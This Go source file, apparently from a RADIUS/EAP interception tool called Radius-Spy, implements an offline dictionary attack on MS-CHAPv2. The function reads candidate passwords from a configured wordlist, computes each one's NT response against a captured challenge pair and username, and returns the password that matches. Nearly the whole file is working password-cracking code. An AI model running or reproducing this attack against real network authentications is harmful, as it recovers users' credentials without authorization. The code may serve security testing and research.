package attack

import (
	"bufio"
	"os"

	"github.com/famez/Radius-Spy/eap"
	"github.com/famez/Radius-Spy/session"

	"github.com/golang/glog"
)

func GuessPasswordFromMsCHAPv2(authChallenge, peerChallenge [16]byte, username string, ntResponse [24]byte) (bool, string) {

	config := session.GetConfig()

	passwordsFile := config.GetPasswordsFile()

	file, err := os.Open(passwordsFile)
	if err != nil {
		glog.V(1).Infoln(err)
		return false, ""
	}

	defer file.Close()

	defer glog.V(2).Infoln("Passwords scanner finished ")

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {

		password := scanner.Text()

		var calculatedResponse [24]byte

		aux := eap.MsChapV2GenerateNTResponse(authChallenge, peerChallenge, username, password)

		if len(aux) != 24 {
			continue
		}

		copy(calculatedResponse[:], aux)

		if calculatedResponse == ntResponse {
			return true, password
		}

	}

	return false, ""
}
